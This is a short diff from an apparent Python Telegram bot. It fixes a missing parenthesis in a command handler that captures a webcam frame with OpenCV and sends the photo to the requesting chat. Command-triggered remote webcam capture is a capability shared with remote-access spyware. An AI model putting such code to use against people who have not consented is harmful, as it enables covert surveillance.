@@ -118,7 +118,7 @@ def check(message):
         if (ret): 
             cv2.imwrite(cam_dir + 'cam.png', frame)
             # Отключаем камеру
-            bot.send_photo(message.chat.id, open(cam_dir + "cam.png", 'rb')
+            bot.send_photo(message.chat.id, open(cam_dir + "cam.png", 'rb'))
         
         cap.release()
     else:
